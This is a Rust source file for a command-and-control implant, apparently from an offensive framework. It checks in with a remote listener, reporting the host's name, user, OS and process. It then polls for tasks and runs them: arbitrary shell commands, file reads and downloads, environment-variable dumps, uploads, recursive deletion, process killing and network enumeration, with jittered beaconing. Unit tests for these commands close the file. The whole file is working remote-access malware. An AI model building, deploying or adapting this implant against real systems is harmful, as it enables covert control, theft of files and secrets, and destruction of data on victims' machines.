use clap::Parser;
use reqwest::Client;
use std::error::Error;
use std::{
    net::UdpSocket,
    sync::atomic::{AtomicU64, Ordering},
    time::{Duration, SystemTime},
};
use tokio::time::sleep;
use uuid::Uuid;

use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
use rb::task::{Task, TaskResult, TaskStatus};

/// CLI arguments for the implant
#[derive(Parser, Debug, Clone)]
pub struct Args {
    /// C2 listener host (default: localhost)
    #[clap(long, default_value = "localhost")]
    pub host: String,

    /// C2 listener port (default: 8080)
    #[clap(short, long, default_value = "8080")]
    pub port: u16,

    /// Poll interval in seconds (default: 5)
    #[clap(long, default_value = "5")]
    pub interval: u64,
}

/// Main entrypoint for the implant logic.
pub async fn run_implant() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    run_implant_with_args(args).await
}

/// Runs the implant with explicitly provided arguments
/// This allows the payload to hardcode values without CLI parsing
pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
    // Build base URL
    let base_url = format!("http://{}:{}", args.host, args.port);

    // Create HTTP client
    let client = Client::new();

    // Derive local IP by opening a UDP socket
    let ip_address = match get_local_ip(&args.host, args.port) {
        Ok(ip) => ip,
        Err(_) => "unknown".to_string(), // Fallback if IP resolution fails
    };

    // Prepare and send the check-in payload
    let checkin = ImplantCheckin {
        id: None,
        hostname: whoami::fallible::hostname().unwrap_or_default(),
        ip_address,
        os_info: whoami::distro(),
        username: whoami::username(),
        process_id: std::process::id(),
    };

    let resp = client
        .post(&format!("{}/checkin", base_url))
        .json(&checkin)
        .send()
        .await?;

    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Check-in failed ({}): {}", status, body).into());
    }
    let data: CheckinResponse = resp.json().await?;
    let implant_id = data.implant_id;
    println!("Checked in. Implant ID: {}", implant_id);

    // Beacon interval in seconds and jitter percent, adjustable at runtime with `sleep`.
    let interval = AtomicU64::new(args.interval.max(1));
    let jitter = AtomicU64::new(0);

    // Poll-execute-report loop
    loop {
        // Fetch tasks for this implant
        let tasks_resp = match client
            .get(&format!("{}/tasks/{}", base_url, implant_id))
            .send()
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                eprintln!("Failed to fetch tasks: {}", e);
                sleep(Duration::from_secs(interval.load(Ordering::SeqCst))).await;
                continue;
            }
        };

        let tasks: Vec<Task> = tasks_resp.json().await.unwrap_or_else(|_| {
            eprintln!("Failed to parse tasks response");
            Vec::new()
        });

        for task in tasks {
            println!("Executing command: {}", task.command);

            let task_result = run_command(&task, implant_id, &interval, &jitter);

            // Post the result back
            if let Err(e) = client
                .post(&format!("{}/results", base_url))
                .json(&task_result)
                .send()
                .await
            {
                eprintln!("Failed to submit results: {}", e);
            }
        }

        // Wait before the next poll, honoring the current interval and jitter.
        let wait = jittered(
            interval.load(Ordering::SeqCst),
            jitter.load(Ordering::SeqCst),
        );
        sleep(Duration::from_secs(wait)).await;
    }
}

fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn Error>> {
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.connect((target_host, target_port))?;
    Ok(socket.local_addr()?.ip().to_string())
}

/// Dispatch a task to the native command implementation and build its result.
pub fn run_command(
    task: &Task,
    implant_id: Uuid,
    interval: &AtomicU64,
    jitter: &AtomicU64,
) -> TaskResult {
    let now = SystemTime::now();

    let result = match task.command.as_str() {
        "pwd" => cmd_pwd(&task.args),
        "ls" => cmd_ls(&task.args),
        "cat" => cmd_cat(&task.args),
        "cd" => cmd_cd(&task.args),
        "mkdir" => cmd_mkdir(&task.args),
        "rm" => cmd_rm(&task.args),
        "mv" => cmd_mv(&task.args),
        "cp" => cmd_cp(&task.args),
        "touch" => cmd_touch(&task.args),
        "download" => cmd_download(&task.args),
        "upload" => cmd_upload(task),
        "systeminfo" => cmd_systeminfo(&task.args),
        "whoami" => cmd_whoami(&task.args),
        "env" => cmd_env(&task.args),
        "ps" => cmd_ps(&task.args),
        "kill" => cmd_kill(&task.args),
        "sleep" => cmd_sleep(&task.args, interval, jitter),
        "netstat" => cmd_netstat(&task.args),
        "ipconfig" => cmd_ipconfig(&task.args),
        "shell" => cmd_shell(&task.args),
        other => Err(format!(
            "Unknown command '{}'. Supported commands: {}",
            other,
            rb::command::implant_cmds::IMPLANT_COMMANDS
                .iter()
                .map(|command| command.name)
                .collect::<Vec<_>>()
                .join(", ")
        )),
    };

    match result {
        Ok(output) => TaskResult {
            task_id: task.id,
            implant_id,
            session_id: task.session_id,
            output,
            error: None,
            status_code: Some(0),
            status: TaskStatus::Completed,
            completed_at: now,
        },
        Err(error) => TaskResult {
            task_id: task.id,
            implant_id,
            session_id: task.session_id,
            output: CommandOutput::None,
            error: Some(error),
            status_code: Some(1),
            status: TaskStatus::Failed,
            completed_at: now,
        },
    }
}

fn cmd_pwd(_args: &[String]) -> Result<CommandOutput, String> {
    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
    Ok(CommandOutput::Text(cwd.display().to_string()))
}

fn cmd_ls(args: &[String]) -> Result<CommandOutput, String> {
    let path = args.first().map(String::as_str).unwrap_or(".");
    let entries = std::fs::read_dir(path).map_err(|e| format!("{}: {}", path, e))?;

    let headers = ["Name", "Type", "Size", "Modified"]
        .iter()
        .map(|s| s.to_string())
        .collect();

    let mut rows: Vec<Vec<String>> = Vec::new();
    for entry in entries {
        let entry = entry.map_err(|e| e.to_string())?;
        let metadata = entry.metadata().ok();
        let kind = match &metadata {
            Some(m) if m.is_dir() => "dir",
            _ => "file",
        };
        let size = metadata
            .as_ref()
            .map(|m| m.len().to_string())
            .unwrap_or_default();
        let modified = metadata
            .as_ref()
            .and_then(|m| m.modified().ok())
            .map(format_time)
            .unwrap_or_default();

        rows.push(vec![
            entry.file_name().to_string_lossy().to_string(),
            kind.to_string(),
            size,
            modified,
        ]);
    }
    rows.sort_by(|a, b| a[0].cmp(&b[0]));

    Ok(CommandOutput::Table { headers, rows })
}

fn cmd_cat(args: &[String]) -> Result<CommandOutput, String> {
    let path = args
        .first()
        .ok_or_else(|| "usage: cat <file>".to_string())?;
    let contents = std::fs::read_to_string(path).map_err(|e| format!("{}: {}", path, e))?;
    Ok(CommandOutput::Text(contents))
}

fn cmd_systeminfo(_args: &[String]) -> Result<CommandOutput, String> {
    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    Ok(CommandOutput::Json(serde_json::json!({
        "hostname": whoami::fallible::hostname().unwrap_or_default(),
        "username": whoami::username(),
        "os": whoami::distro(),
        "arch": std::env::consts::ARCH,
        "pid": std::process::id(),
        "cwd": cwd,
    })))
}

fn format_time(time: SystemTime) -> String {
    match time.duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_secs().to_string(),
        Err(_) => "unknown".to_string(),
    }
}

fn arg(args: &[String], index: usize, usage: &str) -> Result<String, String> {
    args.get(index).cloned().ok_or_else(|| format!("usage: {}", usage))
}

fn home_dir() -> Option<String> {
    std::env::var("HOME")
        .ok()
        .or_else(|| std::env::var("USERPROFILE").ok())
}

/// Run an OS tool and return its combined output as text.
fn run_tool(program: &str, arguments: &[&str]) -> Result<CommandOutput, String> {
    let output = std::process::Command::new(program)
        .args(arguments)
        .output()
        .map_err(|e| format!("failed to run {}: {}", program, e))?;

    let mut text = String::from_utf8_lossy(&output.stdout).to_string();
    text.push_str(&String::from_utf8_lossy(&output.stderr));
    Ok(CommandOutput::Text(text))
}

fn command_exists(program: &str) -> bool {
    std::process::Command::new(program)
        .arg("--version")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok()
}

fn split_recursive_flag(args: &[String]) -> (bool, Vec<String>) {
    let mut recursive = false;
    let mut paths = Vec::new();
    for argument in args {
        if argument == "-r" || argument == "--recursive" {
            recursive = true;
        } else {
            paths.push(argument.clone());
        }
    }
    (recursive, paths)
}

fn cmd_cd(args: &[String]) -> Result<CommandOutput, String> {
    let target = match args.first() {
        Some(path) => path.clone(),
        None => home_dir().ok_or_else(|| "usage: cd <path>".to_string())?,
    };
    std::env::set_current_dir(&target).map_err(|e| format!("{}: {}", target, e))?;
    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
    Ok(CommandOutput::Text(cwd.display().to_string()))
}

fn cmd_mkdir(args: &[String]) -> Result<CommandOutput, String> {
    let path = arg(args, 0, "mkdir <dir>")?;
    std::fs::create_dir_all(&path).map_err(|e| format!("{}: {}", path, e))?;
    Ok(CommandOutput::Text(format!("created {}", path)))
}

fn cmd_touch(args: &[String]) -> Result<CommandOutput, String> {
    let path = arg(args, 0, "touch <file>")?;
    std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .map_err(|e| format!("{}: {}", path, e))?;
    Ok(CommandOutput::Text(format!("touched {}", path)))
}

fn cmd_rm(args: &[String]) -> Result<CommandOutput, String> {
    let (recursive, paths) = split_recursive_flag(args);
    let path = paths
        .first()
        .ok_or_else(|| "usage: rm [-r] <path>".to_string())?;

    let metadata = std::fs::symlink_metadata(path).map_err(|e| format!("{}: {}", path, e))?;
    if metadata.is_dir() {
        if !recursive {
            return Err(format!("{} is a directory (use -r)", path));
        }
        std::fs::remove_dir_all(path).map_err(|e| format!("{}: {}", path, e))?;
    } else {
        std::fs::remove_file(path).map_err(|e| format!("{}: {}", path, e))?;
    }
    Ok(CommandOutput::Text(format!("removed {}", path)))
}

fn cmd_mv(args: &[String]) -> Result<CommandOutput, String> {
    if args.len() < 2 {
        return Err("usage: mv <src> <dst>".to_string());
    }
    let (src, dst) = (&args[0], &args[1]);
    std::fs::rename(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
    Ok(CommandOutput::Text(format!("moved {} to {}", src, dst)))
}

fn cmd_cp(args: &[String]) -> Result<CommandOutput, String> {
    let (recursive, paths) = split_recursive_flag(args);
    if paths.len() < 2 {
        return Err("usage: cp [-r] <src> <dst>".to_string());
    }
    let (src, dst) = (&paths[0], &paths[1]);

    let metadata = std::fs::metadata(src).map_err(|e| format!("{}: {}", src, e))?;
    if metadata.is_dir() {
        if !recursive {
            return Err(format!("{} is a directory (use -r)", src));
        }
        copy_dir(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
    } else {
        std::fs::copy(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
    }
    Ok(CommandOutput::Text(format!("copied {} to {}", src, dst)))
}

fn copy_dir(src: &str, dst: &str) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let target = std::path::Path::new(dst).join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_dir(&entry.path().to_string_lossy(), &target.to_string_lossy())?;
        } else {
            std::fs::copy(entry.path(), &target)?;
        }
    }
    Ok(())
}

fn cmd_download(args: &[String]) -> Result<CommandOutput, String> {
    let path = arg(args, 0, "download <file>")?;
    let data = std::fs::read(&path).map_err(|e| format!("{}: {}", path, e))?;
    let name = std::path::Path::new(&path)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "download.bin".to_string());
    Ok(CommandOutput::File { name, data })
}

fn cmd_whoami(_args: &[String]) -> Result<CommandOutput, String> {
    Ok(CommandOutput::Text(whoami::username()))
}

fn cmd_env(_args: &[String]) -> Result<CommandOutput, String> {
    let headers = vec!["Name".to_string(), "Value".to_string()];
    let mut rows: Vec<Vec<String>> = std::env::vars().map(|(k, v)| vec![k, v]).collect();
    rows.sort_by(|a, b| a[0].cmp(&b[0]));
    Ok(CommandOutput::Table { headers, rows })
}

fn cmd_sleep(
    args: &[String],
    interval: &AtomicU64,
    jitter: &AtomicU64,
) -> Result<CommandOutput, String> {
    let seconds: u64 = args
        .first()
        .ok_or_else(|| "usage: sleep <seconds> [jitter-percent]".to_string())?
        .parse()
        .map_err(|_| "sleep: seconds must be a number".to_string())?;
    if seconds == 0 {
        return Err("sleep: seconds must be greater than 0".to_string());
    }
    let jitter_percent: u64 = match args.get(1) {
        Some(value) => value
            .parse()
            .map_err(|_| "sleep: jitter must be a number".to_string())?,
        None => 0,
    };
    if jitter_percent > 100 {
        return Err("sleep: jitter must be between 0 and 100".to_string());
    }

    interval.store(seconds, Ordering::SeqCst);
    jitter.store(jitter_percent, Ordering::SeqCst);
    Ok(CommandOutput::Text(format!(
        "beacon interval set to {}s (jitter {}%)",
        seconds, jitter_percent
    )))
}

/// Apply jitter to a beacon interval using a time-seeded xorshift.
fn jittered(seconds: u64, jitter_percent: u64) -> u64 {
    let seconds = seconds.max(1);
    if jitter_percent == 0 {
        return seconds;
    }

    let seed = SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(1);
    let mut x = seed | 1;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;

    let span = seconds.saturating_mul(jitter_percent) / 100;
    if span == 0 {
        return seconds;
    }
    let offset = x % (span * 2 + 1); // 0..=2*span
    (seconds + offset).saturating_sub(span).max(1)
}

fn cmd_upload(task: &Task) -> Result<CommandOutput, String> {
    let data = task
        .data
        .as_ref()
        .ok_or_else(|| "upload: no file data received".to_string())?;
    let path = task
        .args
        .first()
        .cloned()
        .unwrap_or_else(|| "upload.bin".to_string());
    std::fs::write(&path, data).map_err(|e| format!("{}: {}", path, e))?;
    Ok(CommandOutput::Text(format!(
        "uploaded {} bytes to {}",
        data.len(),
        path
    )))
}

fn cmd_shell(args: &[String]) -> Result<CommandOutput, String> {
    if args.is_empty() {
        return Err("usage: shell <command>".to_string());
    }
    let command = args.join(" ");
    if cfg!(target_os = "windows") {
        run_tool("powershell", &["-NoProfile", "-Command", command.as_str()])
    } else {
        run_tool("sh", &["-c", command.as_str()])
    }
}

fn cmd_ps(_args: &[String]) -> Result<CommandOutput, String> {
    if cfg!(target_os = "windows") {
        run_tool("tasklist", &[])
    } else {
        run_tool("ps", &["aux"])
    }
}

fn cmd_kill(args: &[String]) -> Result<CommandOutput, String> {
    let pid = arg(args, 0, "kill <pid>")?;
    if cfg!(target_os = "windows") {
        run_tool("taskkill", &["/PID", pid.as_str(), "/F"])
    } else {
        run_tool("kill", &["-9", pid.as_str()])
    }
}

fn cmd_netstat(_args: &[String]) -> Result<CommandOutput, String> {
    if cfg!(target_os = "windows") {
        run_tool("netstat", &["-ano"])
    } else if command_exists("ss") {
        run_tool("ss", &["-tunapl"])
    } else {
        run_tool("netstat", &["-tunap"])
    }
}

fn cmd_ipconfig(_args: &[String]) -> Result<CommandOutput, String> {
    if cfg!(target_os = "windows") {
        run_tool("ipconfig", &["/all"])
    } else {
        run_tool("ip", &["addr"])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn task(command: &str, args: &[&str]) -> Task {
        Task {
            id: Uuid::new_v4(),
            implant_id: Uuid::new_v4(),
            session_id: 0,
            command: command.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            data: None,
            created_at: SystemTime::now(),
            status: TaskStatus::Pending,
        }
    }

    fn run(task: &Task) -> TaskResult {
        run_command(task, task.implant_id, &AtomicU64::new(5), &AtomicU64::new(0))
    }

    #[test]
    fn pwd_returns_a_path() {
        match cmd_pwd(&[]).unwrap() {
            CommandOutput::Text(text) => assert!(!text.is_empty()),
            _ => panic!("expected text output"),
        }
    }

    #[test]
    fn ls_lists_a_known_file() {
        let dir = std::env::temp_dir().join(format!("rb_ls_{}", Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("marker.txt"), b"hi").unwrap();

        match cmd_ls(&[dir.display().to_string()]).unwrap() {
            CommandOutput::Table { rows, .. } => {
                assert!(rows.iter().any(|row| row[0] == "marker.txt"));
            }
            _ => panic!("expected table output"),
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn cat_reads_a_file() {
        let file = std::env::temp_dir().join(format!("rb_cat_{}.txt", Uuid::new_v4()));
        std::fs::write(&file, "hello implant").unwrap();

        match cmd_cat(&[file.display().to_string()]).unwrap() {
            CommandOutput::Text(text) => assert_eq!(text, "hello implant"),
            _ => panic!("expected text output"),
        }

        let _ = std::fs::remove_file(&file);
    }

    #[test]
    fn known_command_completes() {
        let task = task("systeminfo", &[]);
        let result = run(&task);
        assert_eq!(result.status, TaskStatus::Completed);
    }

    #[test]
    fn unknown_command_fails() {
        let task = task("frobnicate", &[]);
        let result = run(&task);
        assert_eq!(result.status, TaskStatus::Failed);
        assert!(result
            .error
            .unwrap_or_default()
            .contains("Unknown command"));
    }

    #[test]
    fn cd_changes_directory() {
        let dir = std::env::temp_dir().join(format!("rb_cd_{}", Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let original = std::env::current_dir().unwrap();

        assert!(cmd_cd(&[dir.display().to_string()]).is_ok());
        assert_eq!(std::env::current_dir().unwrap(), std::fs::canonicalize(&dir).unwrap());

        std::env::set_current_dir(&original).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn file_management_round_trip() {
        let dir = std::env::temp_dir().join(format!("rb_fs_{}", Uuid::new_v4()));
        let root = dir.to_string_lossy().to_string();

        cmd_mkdir(&[format!("{}/sub", root)]).unwrap();

        let file = format!("{}/sub/a.txt", root);
        cmd_touch(&[file.clone()]).unwrap();
        std::fs::write(&file, b"data").unwrap();

        let copy = format!("{}/sub/b.txt", root);
        cmd_cp(&[file.clone(), copy.clone()]).unwrap();
        assert_eq!(std::fs::read_to_string(&copy).unwrap(), "data");

        let dir_copy = format!("{}/sub_copy", root);
        cmd_cp(&["-r".to_string(), format!("{}/sub", root), dir_copy.clone()]).unwrap();
        assert!(std::path::Path::new(&dir_copy).join("a.txt").exists());

        let moved = format!("{}/moved.txt", root);
        cmd_mv(&[copy.clone(), moved.clone()]).unwrap();
        assert!(std::path::Path::new(&moved).exists());

        match cmd_download(&[file.clone()]).unwrap() {
            CommandOutput::File { name, data } => {
                assert_eq!(name, "a.txt");
                assert_eq!(data, b"data");
            }
            _ => panic!("expected file output"),
        }

        cmd_rm(&[file.clone()]).unwrap();
        assert!(!std::path::Path::new(&file).exists());

        cmd_rm(&["-r".to_string(), root.clone()]).unwrap();
        assert!(!std::path::Path::new(&root).exists());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn env_lists_variables() {
        match cmd_env(&[]).unwrap() {
            CommandOutput::Table { rows, .. } => assert!(!rows.is_empty()),
            _ => panic!("expected table output"),
        }
    }

    #[test]
    fn whoami_is_text() {
        match cmd_whoami(&[]).unwrap() {
            CommandOutput::Text(text) => assert!(!text.is_empty()),
            _ => panic!("expected text output"),
        }
    }

    #[test]
    fn shell_runs_a_command() {
        match cmd_shell(&["echo".to_string(), "implant".to_string()]).unwrap() {
            CommandOutput::Text(text) => assert!(text.contains("implant")),
            _ => panic!("expected text output"),
        }
    }

    #[test]
    fn sleep_sets_the_beacon() {
        let interval = AtomicU64::new(5);
        let jitter = AtomicU64::new(0);
        let task = task("sleep", &["30", "20"]);
        let result = run_command(&task, task.implant_id, &interval, &jitter);
        assert_eq!(result.status, TaskStatus::Completed);
        assert_eq!(interval.load(Ordering::SeqCst), 30);
        assert_eq!(jitter.load(Ordering::SeqCst), 20);
    }

    #[test]
    fn jitter_stays_in_range() {
        assert_eq!(jittered(10, 0), 10);
        for _ in 0..50 {
            let value = jittered(10, 50);
            assert!((5..=15).contains(&value), "jittered out of range: {}", value);
        }
    }

    #[test]
    fn upload_writes_data() {
        let dir = std::env::temp_dir().join(format!("rb_up_{}", Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("received.bin");

        let mut task = task("upload", &[path.to_str().unwrap()]);
        task.data = Some(b"payload".to_vec());
        let result = run(&task);

        assert_eq!(result.status, TaskStatus::Completed);
        assert_eq!(std::fs::read(&path).unwrap(), b"payload");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
